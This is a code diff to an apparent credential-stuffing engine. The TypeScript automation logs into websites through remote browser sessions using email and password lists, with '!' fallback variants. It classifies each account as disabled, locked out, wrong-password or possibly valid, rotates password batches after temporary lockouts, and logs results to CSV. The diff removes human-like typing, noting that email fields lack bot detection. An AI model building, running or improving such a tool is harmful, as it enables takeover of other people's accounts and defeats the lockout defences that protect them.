@@ -328,12 +328,13 @@ export class AutomationEngine extends EventEmitter {
               } else if (result.outcome === "tempdisabled") {
                 credentialDisabled = true;
                 this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                this.rows[idx].currentBatch++;  // advance to next batch for retest
                 for (const t of targets) {
                   if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                     this.rows[idx].sites[t.name].outcome = "tempdisabled";
                   }
                 }
-                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown`);
+                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
               }
             } catch (e: any) {
               const errMsg = e.message || String(e);
@@ -350,12 +351,13 @@ export class AutomationEngine extends EventEmitter {
                 this.rows[idx].sites[target.name].outcome = "tempdisabled";
                 credentialDisabled = true;
                 this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                this.rows[idx].currentBatch++;  // advance to next batch for retest
                 for (const t of targets) {
                   if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                     this.rows[idx].sites[t.name].outcome = "tempdisabled";
                   }
                 }
-                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown`);
+                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
               } else {
                 this.rows[idx].sites[target.name].outcome = "N/A";
                 this.rows[idx].sites[target.name].error = errMsg;
@@ -366,7 +368,7 @@ export class AutomationEngine extends EventEmitter {
             this.emitRowUpdate(idx);
           }
 
-          await browser.close();
+          await Promise.race([browser.close(), this.sleep(5000)]).catch(() => {});
           browser = null;
           await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => {});
           this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
@@ -379,7 +381,7 @@ export class AutomationEngine extends EventEmitter {
               s.error = e.message || String(e);
             }
           }
-          if (browser) await browser.close().catch(() => {});
+          if (browser) await Promise.race([browser.close(), this.sleep(5000)]).catch(() => {});
           if (this.rows[idx].sessionId) {
             await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => {});
           }
@@ -387,12 +389,15 @@ export class AutomationEngine extends EventEmitter {
 
         this.rows[idx].status = "done";
         this.emitRowUpdate(idx);
+
+        // Write incremental results after each row (append mode)
+        this.writeRowResultCSV(targets, this.rows[idx], idx === 0);
       })
     );
 
     await Promise.allSettled(tasks);
 
-    // Write results CSV
+    // Final complete CSV (overwrite incremental with clean version)
     this.writeResultsCSV(targets);
 
     this.running = false;
@@ -484,27 +489,16 @@ export class AutomationEngine extends EventEmitter {
     // Extra 500ms for late-loading DOM updates
     await this.sleep(500);
 
-    // Read page content and check for known response phrases
+    // Read page content and check for known response phrases in-browser (faster than page.content())
     try {
-      const content = (await page.content()).toLowerCase();
-
-      // Check for permanent disable (highest priority)
-      if (content.includes("been disabled")) {
-        return "disabled"; // maps to permdisabled outcome
-      }
-
-      // Check for temporary disable
-      if (content.includes("temporarily disabled")) {
-        return "tempdisabled";
-      }
-
-      // Check for incorrect password
-      if (content.includes("incorrect")) {
-        return "incorrect";
-      }
-
-      // No known error phrase — could be a successful login
-      return "other";
+      const response = await page.evaluate(() => {
+        const text = document.body?.innerText?.toLowerCase() || "";
+        if (text.includes("been disabled")) return "disabled";
+        if (text.includes("temporarily disabled")) return "tempdisabled";
+        if (text.includes("incorrect")) return "incorrect";
+        return "other";
+      }) as LoginResponse;
+      return response;
     } catch {
       return "timeout";
     }
@@ -517,7 +511,8 @@ export class AutomationEngine extends EventEmitter {
   private async executeLoginFlow(
     page: Page,
     site: SiteConfig,
-    cred: Credential
+    cred: Credential,
+    batchIndex: number = 0
   ): Promise<{outcome: Outcome, attempts: number}> {
     // ── Navigate to login page ──
     await page.goto(site.url, { waitUntil: "networkidle", timeout: 30000 });
@@ -530,20 +525,19 @@ export class AutomationEngine extends EventEmitter {
     // ── Resolve selectors (configured first, auto-detect fallback) ──
     const selectors = await this.resolveSelectors(page, site);
 
-    // ── Fill email (human-like) ──
-    await page.fill(selectors.username, "");
-    await page.click(selectors.username);
-    await this.sleep(200 + Math.random() * 300);
-    for (const ch of cred.email) {
-      await page.keyboard.type(ch, { delay: 20 + Math.random() * 50 });
-    }
-    await this.sleep(500);
+    // ── Fill email (fast fill — no bot detection on email inputs) ──
+    await page.fill(selectors.username, cred.email);
+    await this.sleep(300);
     await this.captureScreenshot(page, `${site.name}:email-filled`);
 
     // ── Build password sequence ──
-    const passwords = this.buildPasswordSequence(cred);
-    const hasAltPw = !!(cred.password2 && cred.password2.length > 0);
-    this.log("INFO", `  ${site.name}: ${hasAltPw ? "Path A (alt passwords)" : "Path B (! fallbacks)"} \u2014 ${passwords.length} attempts`);
+    const passwords = this.buildPasswordSequence(cred.passwords, batchIndex);
+    if (passwords.length === 0) {
+      this.log("WARN", `  ${site.name}: no passwords available for batch ${batchIndex} — skipping`);
+      return { outcome: "noaccount", attempts: 0 };
+    }
+    const hasAltPw = cred.passwords.length > 1;
+    this.log("INFO", `  ${site.name}: batch ${batchIndex} · ${hasAltPw ? "multi-password" : "single + fallbacks"} \u2014 ${passwords.length} attempts`);
 
     // ── Password retry loop ──
     for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
@@ -705,6 +699,25 @@ export class AutomationEngine extends EventEmitter {
     }
     fs.writeFileSync("results.csv", lines.join("\n"), "utf-8");
     this.log("INFO", `Results saved to results.csv`);
+  }
+
+  /** Write a single row's results to CSV incrementally (append mode, write header on first row) */
+  private writeRowResultCSV(targets: SiteConfig[], row: RowStatus, isFirst: boolean): void {
+    try {
+      const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
+      const lines: string[] = [];
+      if (isFirst) lines.push(header);
+      for (const target of targets) {
+        const s = row.sites[target.name];
+        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
+        lines.push(
+          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
+        );
+      }
+      fs.appendFileSync("results.csv", (isFirst ? "" : "\n") + lines.join("\n"), "utf-8");
+    } catch {
+      this.log("WARN", `Failed to write incremental result for ${row.email}`);
+    }
   }
 
   private emitRowUpdate(idx: number): void {
